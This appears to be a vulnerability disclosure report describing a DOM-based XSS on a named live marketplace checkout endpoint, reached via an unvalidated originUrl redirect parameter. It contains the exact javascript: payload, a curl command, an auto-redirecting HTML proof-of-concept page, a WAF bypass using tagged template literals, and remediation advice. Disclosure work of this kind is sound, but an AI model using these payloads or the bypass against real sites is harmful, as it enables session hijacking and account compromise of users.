# DOM XSS in GET https://marketplace.porsche.com/api/checkout/cart/redirect?listingId=&locale=&marketplaceKey=&originUrl= (High 8.1)

## Summary
Open redirect in /api/checkout/cart/redirect successfully escalated to DOM-based XSS. The originUrl query parameter is reflected without protocol sanitization into cartRedirectPayload via a 302 redirect. The React SPA parses it using JSON.parse with Zod (z.string(), no protocol restriction) and renders it directly into an <a href> anchor tag within the checkout navigation back button. AWS WAF is bypassed using ES6 tagged template literals (no parentheses/dots), and no CSP is deployed.

The `originUrl` parameter on `GET https://marketplace.porsche.com/api/checkout/cart/redirect?listingId=&locale=&marketplaceKey=&originUrl=` executes attacker-controlled JavaScript in a victim browser context, potentially allowing session impersonation and account compromise.

## Severity & CVSS 3.1 Rating
- **Severity**: High (8.1)
- **CVSS 3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

## Steps To Reproduce
1. Navigate directly to the reproduction URL: `https://marketplace.porsche.com/api/checkout/cart/redirect?listingId=1&locale=de_DE&marketplaceKey=default&originUrl=javascript%3Aalert%60Porsche-XSS-Confirmed%60`
2. Observe the HTTP 302 redirect carrying the unvalidated `originUrl` into the `cartRedirectPayload` state object on the checkout view.
3. The React client-side application hydrates and validates the payload using Zod (which accepts any valid string without URI protocol scheme restrictions).
4. The application renders the value into the `href` attribute of the navigation anchor element (`<a href="javascript:alert`Porsche-XSS-Confirmed`">`).
5. Click the navigation back link (or trigger automatic execution) to observe arbitrary JavaScript execution in the authenticated context of marketplace.porsche.com.
6. Bypass Note: AWS WAF rules targeting `alert(...)` or function calls with parentheses are bypassed using ES6 tagged template literals. No Content Security Policy (CSP) is deployed to restrict script execution.

### Proof of Concept (cURL Command)
```bash
curl -i -s -k -X GET "https://marketplace.porsche.com/api/checkout/cart/redirect?listingId=&locale=&marketplaceKey=&originUrl=javascript%3Aalert%60Porsche-XSS-Confirmed%60"
```

### Standalone HTML Exploit (PoC)
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS PoC - https://marketplace.porsche.com/api/checkout/cart/redirect?listingId=&amp;locale=&amp;marketplaceKey=&amp;originUrl=</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 40px; background: #0d1117; color: #c9d1d9; }
    .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 24px; max-width: 700px; margin: 0 auto; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
    h1 { color: #58a6ff; font-size: 20px; margin-top: 0; }
    p { font-size: 14px; line-height: 1.6; color: #8b949e; }
    .btn { display: inline-block; background: #238636; color: #ffffff; padding: 10px 20px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 15px; }
    .btn:hover { background: #2ea043; }
    pre { background: #090d13; padding: 12px; border-radius: 6px; overflow-x: auto; color: #79c0ff; border: 1px solid #21262d; font-size: 13px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>XSS PoC - https://marketplace.porsche.com/api/checkout/cart/redirect?listingId=&amp;locale=&amp;marketplaceKey=&amp;originUrl=</h1>
    <p>This standalone Proof of Concept demonstrates client-side JavaScript execution via parameter <code>originUrl</code>.</p>
    <pre>https://marketplace.porsche.com/api/checkout/cart/redirect?listingId=&amp;locale=&amp;marketplaceKey=&amp;originUrl=javascript%3Aalert%60Porsche-XSS-Confirmed%60</pre>
    <a href="https://marketplace.porsche.com/api/checkout/cart/redirect?listingId=&amp;locale=&amp;marketplaceKey=&amp;originUrl=javascript%3Aalert%60Porsche-XSS-Confirmed%60" class="btn" target="_blank">Click Here to Launch Exploit</a>
  </div>
  <script>
    // Automatic navigation after 2 seconds
    setTimeout(function() {
      window.location.href = "https://marketplace.porsche.com/api/checkout/cart/redirect?listingId=&locale=&marketplaceKey=&originUrl=javascript%3Aalert%60Porsche-XSS-Confirmed%60";
    }, 2000);
  </script>
</body>
</html>
```

## Payload
```html
javascript:alert`Porsche-XSS-Confirmed`
```

## Impact
Confirmed browser JavaScript execution, potentially allowing session impersonation.

- Internal Impact Score: n/a
- Tags: browser-execution

## Supporting Evidence
- Finding ID: 7
- Execution IDs: n/a
- Oracle tokens: n/a
- Screenshots: n/a

## Remediation
- Apply context-aware contextual output encoding (e.g. HTML entity, JavaScript attribute, or URL encoding) before rendering untrusted input.
- Avoid assigning user-controllable input to dangerous execution sinks such as `innerHTML`, `document.write`, `eval`, `Function`, or navigation sinks (`location.href`).
- Enforce a restrictive Content Security Policy (CSP) with strict script-src and object-src directives.
- Add automated regression tests covering this endpoint and parameter.